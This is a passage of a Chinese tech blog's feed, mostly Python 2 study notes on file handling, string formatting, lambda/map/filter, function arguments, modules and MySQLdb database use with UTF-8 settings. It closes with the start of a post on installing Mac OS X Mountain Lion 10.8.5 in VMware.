class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>经验三：如果对文件操作，打开文件的时候，最好用codecs.open，替代open：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.open(<span class="string">'filename'</span>, encoding=<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure><p>关于print：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> line,     <span class="comment">#后面加一个逗号，就去掉了原来默认增加的\n了</span></span><br></pre></td></tr></table></figure><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="打开文件的模式"><a href="#打开文件的模式" class="headerlink" title="打开文件的模式"></a>打开文件的模式</h3><p>r    以读方式打开文件，可读取文件信息。<br>w    以写方式打开文件，可向文件写入信息。如文件存在，则清空该文件，再写入新内容<br>a    以追加模式打开文件（即一打开文件，文件指针自动移到文件末尾），如果文件不存在则创建<br>r+    以读写方式打开文件，可对文件进行读和写操作。<br>w+    消除文件内容，然后以读写方式打开文件。<br>a+    以读写方式打开文件，并把文件指针移到文件尾。<br>b    以二进制模式打开文件，而不是以文本模式。该模式只对Windows或Dos有效，类Unix的文件是用二进制模式进行操作的。</p><p>文件相关信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">"131.txt"</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.name</span><br><span class="line"><span class="string">'131.txt'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.mode      <span class="comment">#显示当前文件打开的模式</span></span><br><span class="line"><span class="string">'a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.closed    <span class="comment">#文件是否关闭，如果关闭，返回True；如果打开，返回False</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()   <span class="comment">#关闭文件的内置函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.closed</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>文件状态信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file_stat = os.stat(<span class="string">"131.txt"</span>)      <span class="comment">#查看这个文件的状态</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file_stat                           <span class="comment">#文件状态是这样的。从下面的内容，有不少从英文单词中可以猜测出来。</span></span><br><span class="line">posix.stat_result(st_mode=<span class="number">33204</span>, st_ino=<span class="number">5772566L</span>, st_dev=<span class="number">2049L</span>, st_nlink=<span class="number">1</span>, st_uid=<span class="number">1000</span>, st_gid=<span class="number">1000</span>, st_size=<span class="number">69L</span>, st_atime=<span class="number">1407897031</span>, st_mtime=<span class="number">1407734600</span>, st_ctime=<span class="number">1407734600</span>)</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file_stat.st_ctime                  <span class="comment">#这个是文件创建时间</span></span><br><span class="line"><span class="number">1407734600.0882277</span>                      <span class="comment">#换一种方式查看这个时间</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> time</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>time.localtime(file_stat.st_ctime)  <span class="comment">#这回看清楚了</span></span><br><span class="line">time.struct_time(tm_year=<span class="number">2014</span>, tm_mon=<span class="number">8</span>, tm_mday=<span class="number">11</span>, tm_hour=<span class="number">13</span>, tm_min=<span class="number">23</span>, tm_sec=<span class="number">20</span>, tm_wday=<span class="number">0</span>, tm_yday=<span class="number">223</span>, tm_isdst=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h2><p>两个变量的值调换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a, b = b, a</span><br></pre></td></tr></table></figure><p>上面本质上是序列赋值。如果左边的变量是序列，右边的对象也是序列，两者将一一对应地进行赋值。</p><p>eval()是把字符串中符合python表达式的东西计算出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span>+<span class="number">4</span>         <span class="comment">#这是一个表达式，python会根据计算法则计算出结果来</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"3+4"</span>       <span class="comment">#这是一个字符串，python就不计算里面的内容了，虽然里面是一个符合python规范的表达式</span></span><br><span class="line"><span class="string">'3+4'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">"3+4"</span>)　<span class="comment">#这里就跟上面不一样了，就把字符串里面的表达式计算出来了</span></span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><p>exec(),这个函数专门来执行字符串或文件里面的python语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">exec</span> <span class="string">"print 'hello'"</span></span><br><span class="line">hello</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"print 'hello'"</span></span><br><span class="line"><span class="string">"print 'hello'"</span></span><br></pre></td></tr></table></figure><p>print详解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3.1415926</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"%d"</span>%a    <span class="comment">#%d只能输出整数,int类型</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"%f"</span>%a　　<span class="comment">#%f输出浮点数</span></span><br><span class="line"><span class="number">3.141593</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"%.2f"</span>%a　<span class="comment">#按照要求输出小数位数</span></span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"%.9f"</span>%a  <span class="comment">#如果要求的小数位数过多，后面就用0补全</span></span><br><span class="line"><span class="number">3.141592600</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"%4d"</span>%b   <span class="comment">#如果是整数，这样写要求该整数占有四个位置，于是在前面增加三个空格</span></span><br><span class="line">   <span class="number">3</span>                <span class="comment">#而不是写成0003的样式</span></span><br></pre></td></tr></table></figure><p>换一种范式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math     <span class="comment">#引入数学模块</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"PI=%f"</span>%math.pi <span class="comment">#默认，将圆周率打印成这个样子</span></span><br><span class="line">PI=<span class="number">3.141593</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"PI=%10.3f"</span>%math.pi　<span class="comment">#约束一下，这个的含义是整数部分加上小数点和小数部分共计10位，并且右对齐</span></span><br><span class="line">PI=     <span class="number">3.142</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"PI=%-10.3f"</span>%math.pi　<span class="comment">#要求显示的左对齐，其余跟上面一样</span></span><br><span class="line">PI=<span class="number">3.142</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"PI=%06d"</span>%int(math.pi) <span class="comment">#整数部分的显示，要求共6位,这样前面用0补足了。</span></span><br><span class="line">PI=<span class="number">000003</span></span><br></pre></td></tr></table></figure><p>%r是万能的吗？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"PI=%r"</span>%math.pi</span><br><span class="line">PI=<span class="number">3.141592653589793</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"Pi=%r"</span>%int(math.pi)</span><br><span class="line">Pi=<span class="number">3</span></span><br></pre></td></tr></table></figure><p>占位符%s调用的是str()函数把对象转化为str类型，而%r是调用了repr()将对象转化为字符串。</p><p>格式化基本操作：用format</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment">#先做一个字符串模板</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>template = <span class="string">"My name is &#123;0&#125;. My website is &#123;1&#125;. I am writing &#123;2&#125;."</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment">#用format依次对应模板中的序号内容</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>template.format(<span class="string">"g2ex"</span>,<span class="string">"g2ex.github.io"</span>,<span class="string">"python"</span>)</span><br><span class="line"><span class="string">'My name is g2ex. My website is g2ex.github.io. I am writing python.'</span></span><br></pre></td></tr></table></figure><p>除了可以按照对应顺序（类似占位符了）填充模板中的位置之外，还能这样，用关键字来指明所应该田中的内容。此外，关键字和位置编号可以混用。</p><h2 id="小函数"><a href="#小函数" class="headerlink" title="小函数"></a>小函数</h2><p>lambda：后面直接跟变量，变量后面是冒号，冒号后面是表达式，表达式计算结果就是本函数的返回值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arg1, arg2, ...argN : expression using arguments</span><br></pre></td></tr></table></figure><p>map：map()是python的一个内置函数，它的基本样式是：map(func, seq)，func是一个函数，seq是一个序列对象。</p><p>reduce：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reduce(<span class="keyword">lambda</span> x,y: x+y,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure><p>filter：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>numbers = range(<span class="number">-5</span>,<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>numbers</span><br><span class="line">[<span class="number">-5</span>, <span class="number">-4</span>, <span class="number">-3</span>, <span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>filter(<span class="keyword">lambda</span> x: x&gt;<span class="number">0</span>, numbers)</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> numbers <span class="keyword">if</span> x&gt;<span class="number">0</span>] <span class="comment">#与上面那句等效</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>filter(<span class="keyword">lambda</span> c: c!=<span class="string">'p'</span>, <span class="string">'python'</span>) <span class="comment">#能不能对应上面文档说明那句话呢？</span></span><br><span class="line"><span class="string">'ython'</span> <span class="comment">#“If iterable is a string or a tuple, the result also has that type;”</span></span><br></pre></td></tr></table></figure><h2 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(x,y,z,*args,**kargs)</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> x</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> y</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> z</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> args</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">print</span> kargs</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="string">'abc'</span>,<span class="number">2</span>,<span class="string">"python"</span>)</span><br><span class="line">abc</span><br><span class="line"><span class="number">2</span></span><br><span class="line">python</span><br><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">(<span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,name=<span class="string">"abc"</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">(<span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">&#123;<span class="string">'name'</span>: <span class="string">'abc'</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>类构造函数中的第一个参数self用来接收实例化过程中传入的所有数据，这些数据是通过构造函数后面的参数导入的。self是一个实例（准确说是实例的引用变量）。</p><p>id()内置函数可以查看object在内存中的地址。</p><h2 id="import模块"><a href="#import模块" class="headerlink" title="import模块"></a>import模块</h2><p>当前目录下编写abc.py，使用import abc导入模块，文件名（不含扩展名.py）就是模块名。</p><p>import模块的时候，Python会把模块.py编译为模块.pyc，并不是每次import的时候都编译，只有改动了模块.py后在import时Python自动编译。如果改动了模块.py但没有再次import，可以使用内置函数reload(模块)重新加载。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p><code>os.path.&lt;attribute&gt;</code></p><p>常用方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">os.path.abspath(filename) 文件的绝对路径</span><br><span class="line">os.path.isfile(filename) 判断在该路径中，是否存在那个文件，如果存在则返回<span class="literal">True</span>，否则<span class="literal">False</span></span><br><span class="line">os.path.split() 参数是目录加文件名，就可以将路径和文件名分开</span><br><span class="line">os.path.exists(path) 判断目录是否存在</span><br><span class="line">os.path.isabs(path) 判断path是否为绝对路径</span><br><span class="line">os.paht.isdir(path) 判断path是否为存在的目录</span><br><span class="line">os.path.join(path1, path2, ..., filename) 将多个路径组合</span><br></pre></td></tr></table></figure><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install mysql-server <span class="comment"># Ubuntu中安装MySQL</span></span><br><span class="line">$ sudo service mysql start <span class="comment"># 启动MySQL</span></span><br><span class="line"><span class="comment"># 初次使用设置密码</span></span><br><span class="line">$ mysql -u root</span><br><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON *.* TO root@localhost IDENTIFIED BY <span class="string">"123456"</span>;</span><br><span class="line"><span class="comment"># 以后使用密码123456登陆</span></span><br><span class="line">$ mysql -u root -p</span><br><span class="line">Enter password:</span><br></pre></td></tr></table></figure><p>常用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">help</span>;</span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">mysql&gt; create database <span class="built_in">test</span> character <span class="built_in">set</span> utf8;</span><br><span class="line">mysql&gt; use <span class="built_in">test</span>;</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">mysql&gt; create table users(id int(2) not null primary key auto_increment,username varchar(40),password text,email text)default charset=utf8;</span><br><span class="line">mysql&gt; desc users; <span class="comment"># 显示表users的结构</span></span><br><span class="line">mysql&gt; insert into users(username,password,email) values(<span class="string">"foo"</span>,<span class="string">"123456"</span>,<span class="string">"foo@gmail.com"</span>);</span><br><span class="line">mysql&gt; select * from users;</span><br></pre></td></tr></table></figure><h2 id="Python数据库操作"><a href="#Python数据库操作" class="headerlink" title="Python数据库操作"></a>Python数据库操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python-mysqldb <span class="comment"># 安装python-MySQLdb</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python中导入</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> MySQLdb</span><br><span class="line"><span class="comment"># conn是MySQLdb.connect()的实例对象，拥有`commit()` `roolback()` `cursor([cursorclass])`属性</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn = MySQLdb.connect(host=<span class="string">"localhost"</span>,user=<span class="string">"root"</span>,passwd=<span class="string">"123456"</span>,db=<span class="string">"databasename"</span>,port=<span class="number">3306</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur = conn.cursor() <span class="comment"># 使用游标</span></span><br><span class="line"><span class="comment"># cursor执行命令的方法：</span></span><br><span class="line"><span class="comment"># execute(query, args):执行单条sql语句。query为sql语句本身，args为参数值的列表。执行后返回值为受影响的行数</span></span><br><span class="line"><span class="comment"># executemany(query, args):执行单条sql语句，但是重复执行参数列表里的参数，返回值为受影响的行数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.execute(<span class="string">"insert into users (username,password,email) values (%s,%s,%s)"</span>,(<span class="string">"abc"</span>,<span class="string">"123456"</span>,<span class="string">"abc@gmail.com"</span>))</span><br><span class="line"><span class="number">1L</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.executemany(<span class="string">"insert into users (username,password,email) values (%s,%s,%s)"</span>,((<span class="string">"google"</span>,<span class="string">"111222"</span>,<span class="string">"g@gmail.com"</span>),(<span class="string">"facebook"</span>,<span class="string">"222333"</span>,<span class="string">"f@face.book"</span>),(<span class="string">"github"</span>,<span class="string">"333444"</span>,<span class="string">"git@hub.com"</span>),(<span class="string">"docker"</span>,<span class="string">"444555"</span>,<span class="string">"doc@ker.com"</span>)))</span><br><span class="line"><span class="number">4L</span></span><br><span class="line"><span class="comment"># 使用cur.execute()之后必须使用commit()才能提交到数据库中</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn.commit()</span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.execute(<span class="string">"select * from users"</span>)</span><br><span class="line"><span class="number">5L</span></span><br><span class="line"><span class="comment"># 查询记录赋值给lines，可以使用fetchall(self)接收全部返回结果行；fetchmany(size=None)接收size条返回结果行；fetchone()返回一条结果行；scroll(value, mode='relative')移动指针到某一行，如果mode='relative'，则表示从当前所在行移动value条，如果mode='absolute'，则表示从结果集的第一行移动value条。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lines = cur.fetchall()</span><br><span class="line"><span class="comment"># 当使用cur = conn.cursor(cursorclass=MySQLdb.cursors.DictCursor)时，cur.fetchall()系列返回的元组中的元素是一个个字典，不指定cursorclass返回的元组中的元素是一个个元组</span></span><br><span class="line"><span class="comment"># 更新数据</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.execute(<span class="string">"update users set username=%s where id=2"</span>,(<span class="string">"mypython"</span>))</span><br></pre></td></tr></table></figure><h2 id="MySQL高级操作"><a href="#MySQL高级操作" class="headerlink" title="MySQL高级操作"></a>MySQL高级操作</h2><p>在conn = MySQLdb.connect()中，如果不指定数据库，可以使用conn.select_db(“test”)选择test数据库，也可以新建数据库。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur = conn.cursor()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.execute(<span class="string">"create database newtest"</span>)</span><br><span class="line"><span class="number">1L</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.execute(<span class="string">"create table newusers (id int(2) primary key auto_increment, username varchar(20), age int(2), email text)"</span>)</span><br><span class="line"><span class="number">0L</span></span><br><span class="line"><span class="comment"># 可以查看表</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.execute(<span class="string">"show tables"</span>)</span><br><span class="line"><span class="number">1L</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.fetchall()</span><br><span class="line">((<span class="string">u'newusers'</span>,),)</span><br><span class="line"><span class="comment"># 最后要关闭一切</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn.close()</span><br></pre></td></tr></table></figure><h2 id="关于数据库乱码问题"><a href="#关于数据库乱码问题" class="headerlink" title="关于数据库乱码问题"></a>关于数据库乱码问题</h2><p>这个问题是编写web时常常困扰程序员的问题，乱码的本质来自于编码格式的设置混乱。所以，要特别提醒诸位注意。在用python-mysqldb的时候，为了放置乱码，可以做如下统一设置：</p><ol><li>Python文件设置编码utf-8</li><li>MySQL数据库charset=utf8</li><li>Python连接MySQL是加上参数charset=utf8</li><li>设置Python的默认编码为utf-8：sys.setdefaultencoding(utf-8)</li></ol><p>代码示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"> </span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br><span class="line"> </span><br><span class="line">db=MySQLdb.connect(user=<span class="string">'root'</span>,charset=<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure><p>MySQL的配置文件设置也必须配置成utf8 设置 MySQL 的 my.cnf 文件，在 [client]/[mysqld]部分都设置默认的字符集（通常在/etc/mysql/my.cnf)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[client] default-character-set = utf8</span><br><span class="line">[mysqld] default-character-set = utf8</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近要写爬虫，复习了Python的基础知识，记录了学习&lt;a href=&quot;http://looly.gitbooks.io/python-basic/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;零基础学Python&lt;/a&gt;过程中的一些笔记。&lt;/p&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="Python" scheme="https://g2ex.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>VMware Workstation 10安装Mac OS X Mountain Lion 10.8.5</title>
    <link href="https://g2ex.top/2014/10/12/VMware-Workstation-10-Install-Mac-OS-X-Mountain-Lion-10.8.5/"/>
    <id>https://g2ex.top/2014/10/12/VMware-Workstation-10-Install-Mac-OS-X-Mountain-Lion-10.8.5/</id>
    <published>2014-10-12T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于原版OS-X-Mountain-Lion-10-8-5"><a href="#关于原版OS-X-Mountain-Lion-10-8-5" class="headerlink" title="关于原版OS X Mountain Lion 10.8.5"></a>关于原版OS X Mountain Lion 10.8.5</h2><p>Mac OS X Mountain Lion 10.8.5作为Mountain Lion的最后一个稳定版本值得我们收藏。可能大家有所不知，10.8.5版本是分为两个Build的，一个是在2013年9月13日发布的<code>10.8.5 Build 12F37</code>，另一个是2013年10月3日发布的<code>10.8.5 Build 12F45</code>。也就是说，<code>10.8.5 Build 12F45</code>才是Mountain Lion的最终版本。<a href="https://en.wikipedia.org/wiki/OS_X_Mountain_Lion" target="_blank" rel="noopener"><code>OS X Mountain Lion的维基百科</code></a></p><p>不幸的是，网友们和论坛中分享的<a href="http://bbs.pcbeta.com/viewthread-1404580-1-1.html" target="_blank" rel="noopener">OS X Mountain Lion 10.8.5 正式版 原版完整DMG安装镜像</a>大多数是Build 12F37版本（从发帖日期就可以看出来），网上搜索到的种子文件也是Build 12F37的种子。要想下载原版Build 12F45，可以搜索<code>OSX1085-12F45-ESD.dmg</code>，或者从这里下载：<a href="http://pan.baidu.com/s/1f68Vv" target="_blank" rel="noopener">http://pan.baidu.com/s/1f68Vv</a></p><h2 id="怎么知道下载了哪个版本？"><a href="#怎么知道下载了哪个版本？" class="headerlink" 